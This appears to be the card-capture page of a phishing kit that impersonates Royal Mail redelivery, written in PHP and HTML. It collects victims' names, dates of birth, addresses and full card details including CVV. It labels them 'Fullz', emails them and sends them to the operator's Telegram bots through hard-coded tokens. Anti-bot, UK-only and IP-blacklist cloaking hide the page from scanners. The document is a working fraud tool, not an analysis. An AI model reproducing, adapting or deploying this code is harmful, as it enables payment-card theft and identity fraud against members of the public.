<?php
// @Kr3pto on telegram
require "configg.php";
require "rumi_assetz/vinc/session_protect.php";
require "rumi_assetz/vinc/functions.php";
if($internal_antibot == 1){
	require "rumi_assetz/old_blocker.php";
}
if($enable_killbot == 1){
	if(checkkillbot($killbot_key) == true){
		$fp = fopen("rumi_assetz/vinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($mobile_lock == 1){
	require "rumi_assetz/mob_lock.php";
}
if($UK_lock == 1){
	if(onlyuk() == true){
	
	}else{
		$fp = fopen("rumi_assetz/vinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($external_antibot == 1){
	if(checkBot($apikey) == true){
		$fp = fopen("rumi_assetz/vinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
error_reporting(0);
ini_set('display_errors', '0');
date_default_timezone_set('Europe/London');
session_start();
if($_POST['ccname'] and $_POST['ccnum'] and $_POST['ccexp'] and $_POST['cccvv']){
	$_SESSION['ccname'] = $_POST['ccname'];
	$_SESSION['ccnum'] = $_POST['ccnum'];
	$_SESSION['ccexp'] = $_POST['ccexp'];
	$_SESSION['cccvv'] = $_POST['cccvv'];
	
	$fullname = $_SESSION['fullname'];
	$dob = $_SESSION['dob'];
	$mobile = $_SESSION['mobile'];
	$address = $_SESSION['address'];
	$town = $_SESSION['town'];
	$postcode = $_SESSION['postcode'];
	
	$ccname = $_SESSION['ccname'];
	$ccnum = $_SESSION['ccnum'];
	$ccexp = $_SESSION['ccexp'];
	$cccvv = $_SESSION['cccvv'];
	
	
	$ccno = str_replace(' ', '', $ccnum);
	$bin = substr($ccno, 0, 6);
	$ccc = bankDetails($bin);
	$scheme =  strtoupper($ccc['scheme']);
	$type =  strtoupper($ccc['type']);
	$brand =  strtoupper($ccc['brand']);
	$bank =  strtoupper($ccc['bank']['name']);
	$bin =  strtoupper($ccc['bin']);
	$country =  strtoupper($ccc['country']['alpha2']);
	if($ccc['prepaid'] == true){$prepaid = strtoupper('Prepaid');}else{$prepaid = strtoupper('Non-Prepaid');}
	$ccinfo = "$bin | $scheme | $type | $brand | $bank";
	
	
	$date = date('l d F Y');
	$time = date('H:i');
	$ip = $_SERVER['REMOTE_ADDR'];
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$os = os_info($useragent);
	$browser = browsername();
	$VictimInfo  = "| IP Address : $ip\n";
	$VictimInfo .= "| UserAgent : $useragent\n";
	$VictimInfo .= "| Browser : $browser\n";
	$VictimInfo .= "| OS : $os";
	
	$headers = "From:$ccname <Kr3ptoRoyalMail@results.co.uk>";
	$subj = "Kr3pto RoyalMail Fullz $bin - $type $brand $bank [$ip]";
	
	$data = "
+ ------------- RoyalMail Fullz --------------+
+ ------------------------------------------+
+ Personal Information
| Full name : $fullname
| DOB : $dob
| Mobile : $mobile
| Address : $address
| Town : $town
| Postal Code : $postcode
+ ------------------------------------------+
+ Card Information
| Holder Name : $ccname
| Card Number : $ccnum
| Card Expiry : $ccexp
| CVV : $cccvv
| BIN : $ccinfo
+ ------------------------------------------+
+ Victim Information
$VictimInfo
| Received : $date @ $time
+ ---------------- @Kr3pto ------------------+
";
	function send_email_and_telegram($to, $subj, $data, $headers) {
    // Send the email
    $mail_sent = mail($to, $subj, $data, $headers);

    // Define your bot tokens (Replace with your actual bot tokens)
    $bot1_token = "1969787235:AAFoEg5SZ11w7xdung6ksbChyh0nX86p0ss";
    $bot2_token = "1969787235:AAFoEg5SZ11w7xdung6ksbChyh0nX86p0ss";

    // Define your chat IDs (Replace with the actual chat IDs or user IDs)
    $chat_id_1 = "5078365554";
    $chat_id_2 = "7694983632";

    // Prepare the message
    $message = urlencode($data);  // URL encode the message to ensure it's safe for URL usage

    // Send the message to Bot 1
    $telegram_url_1 = "https://api.telegram.org/bot$bot1_token/sendMessage?chat_id=$chat_id_1&text=$message";
    $response1 = file_get_contents($telegram_url_1);

    // Send the message to Bot 2
    $telegram_url_2 = "https://api.telegram.org/bot$bot2_token/sendMessage?chat_id=$chat_id_2&text=$message";
    $response2 = file_get_contents($telegram_url_2);

    // Optionally, check for errors or log responses
    if ($mail_sent) {
        // If the email was sent successfully, you can log or return a success message
        echo "Email sent successfully!";
    } else {
        // Handle email sending failure
        echo "Failed to send email.";
    }

    return $mail_sent; // Return the status of the mail function
}


// Call the function
send_email_and_telegram($to, $subj, $data, $headers);
if($saveonhost == 1){
	$fp = fopen('page_l0gz/RoyalMail_Fullzz_.txt', 'a');
	fwrite($fp, $data."\n");
	fclose($fp);
}
	
if($One_Time_Access==1){
	$fp = fopen("rumi_assetz/vinc/blacklist.dat", "a");
	fputs($fp, "\r\n$ip\r\n");
	fclose($fp);
}
	
}else{
	$fp = fopen("rumi_assetz/vinc/blacklist.dat", "a");
	fputs($fp, "\r\n$ip\r\n");
	fclose($fp);
	header_remove();
	header("Connection: close\r\n");
	http_response_code(404);
	exit;
}
?>
<!DOCTYPE html>
<html class="js-focus-visible windows desktop stidmnmj dupjqsaz landscape">
    <head>
        <meta charset="utf-8" />
        <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1" />
        <title>Royal Mail | Redelivery</title>
		<meta http-equiv="refresh" content="10;url=<?=$ExitLink;?>" />
        <link rel="stylesheet" href="rumi_assetz/css/main.e294acd5.chunk.css" />
        <link rel="stylesheet" href="rumi_assetz/css/collect.css" />
        <link rel="shortcut icon" href="rumi_assetz/img/favicon.ico" />
    </head>
    <body>
        <div id="root">
            <div id="auto-dark-mode-detection-id" class="jss1"></div>
            <div class="jss9">
                <div name="headerBar">
                    <header class="MuiPaper-root MuiAppBar-root MuiAppBar-positionStatic MuiAppBar-colorPrimary jss16 MuiPaper-elevation0">
                        <div class="MuiContainer-root jss17 MuiContainer-maxWidthLg">
                            <div class="MuiToolbar-root MuiToolbar-regular jss18">
                                <a class="jss21" href="javascript:void(0);">
                                    <svg viewBox="0 0 75 50" focusable="false">
                                        <defs>
                                            <style>
                                                .a {
                                                    fill: #fff;
                                                }
                                                .b {
                                                    fill: #e70006;
                                                }
                                                .c {
                                                    fill: #fddd1c;
                                                }
                                            </style>
                                        </defs>
                                        <title>Royal Mail</title>
                                        <rect class="a" x="24.875" y="0.375" width="25.25" height="49.25"></rect>
                                        <path class="a" d="M49.75.75v48.5H25.25V.75h24.5M50.5,0h-26V50h26V0Z"></path>
                                        <rect class="b" x="0.385" y="23.385" width="74.229" height="18.229"></rect>
                                        <path class="a" d="M74.229,23.771V41.229H.771V23.771H74.229M75,23H0V42H75V23Z"></path>
                                        <image
                                            width="113"
                                            height="99"
                                            transform="translate(28.306 3.424) scale(0.163 0.163)"
                                            xlink:href="data:image/png;base64,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"
                                        ></image>
                                        <path
                                            class="c"
                                            d="M11.931,36.607,9.437,33.051a3.224,3.224,0,0,0,1-.664,3.6,3.6,0,0,0,1.048-2.493,3.259,3.259,0,0,0-.959-2.317,3.1,3.1,0,0,0-2.272-.915H4.789v9.945H6.412V28.285H8.227a1.734,1.734,0,0,1,1.136.443,1.845,1.845,0,0,1,.487,1.18,1.737,1.737,0,0,1-1.623,1.756h-1.8l3.467,4.943Z"
                                        ></path>
                                        <path
                                            class="c"
                                            d="M20.739,29.126v3.807a3.283,3.283,0,0,0,.959,2.316,3.189,3.189,0,0,0,2.316.915,3.054,3.054,0,0,0,1.623-.442v.309a1.618,1.618,0,0,1-1.623,1.623,1.589,1.589,0,0,1-1.534-1.062H20.8a3.378,3.378,0,0,0,.93,1.785,3.327,3.327,0,0,0,2.316.959,3.192,3.192,0,0,0,2.272-.959,3.114,3.114,0,0,0,.959-2.316v-6.92H25.652v3.718a1.646,1.646,0,1,1-3.29.089V29.126Z"
                                        ></path>
                                        <rect class="c" x="37.397" y="26.677" width="1.667" height="9.944"></rect>
                                        <rect class="c" x="68.543" y="26.677" width="1.667" height="9.944"></rect>
                                        <rect class="c" x="65.46" y="29.126" width="1.667" height="7.495"></rect>
                                        <polygon
                                            class="c"
                                            points="44.951 36.622 46.264 29.259 49.599 36.489 52.933 29.259 54.246 36.622 55.928 36.622 54.128 26.677 52.328 26.677 49.613 32.594 46.854 26.677 45.054 26.677 43.298 36.622 44.951 36.622"
                                        ></polygon>
                                        <path class="c" d="M67.2,27.4a.9.9,0,1,1-.9-.9.894.894,0,0,1,.9.9"></path>
                                        <path
                                            class="c"
                                            d="M36.069,36.636V29.1H32.218a3.882,3.882,0,0,0-3.9,3.851,3.987,3.987,0,0,0,1.136,2.759,3.92,3.92,0,0,0,2.759,1.136,3.821,3.821,0,0,0,2.228-.753v.546Zm-1.608-3.688a2.265,2.265,0,0,1-2.228,2.272,2.368,2.368,0,0,1-1.579-.664,2.18,2.18,0,0,1-.664-1.623,2.107,2.107,0,0,1,.664-1.579,2.3,2.3,0,0,1,1.579-.664h2.228Z"
                                        ></path>
                                        <path class="c" d="M15.914,28.89a3.969,3.969,0,1,0,3.969,3.969A3.961,3.961,0,0,0,15.914,28.89Zm0,6.315a2.346,2.346,0,1,1,2.346-2.346A2.342,2.342,0,0,1,15.914,35.205Z"></path>
                                        <path
                                            class="c"
                                            d="M64.073,36.636V29.1H60.222a3.881,3.881,0,0,0-3.9,3.851,3.983,3.983,0,0,0,1.136,2.759,3.918,3.918,0,0,0,2.759,1.136,3.821,3.821,0,0,0,2.228-.753v.546ZM62.45,32.948a2.265,2.265,0,0,1-2.228,2.272,2.368,2.368,0,0,1-1.579-.664,2.18,2.18,0,0,1-.664-1.623,2.107,2.107,0,0,1,.664-1.579,2.3,2.3,0,0,1,1.579-.664H62.45Z"
                                        ></path>
                                    </svg>
                                </a>
                                <h2 class="MuiTypography-root jss22 MuiTypography-h2" style="width: 100%;">
                                    <a class="jss27 jss26" href="javascript:void(0);" style="margin-left: auto; float: right;">
                                        <div class="jss23"><div class="jss24">Redelivery</div></div>
                                    </a>
                                </h2>
                            </div>
                        </div>
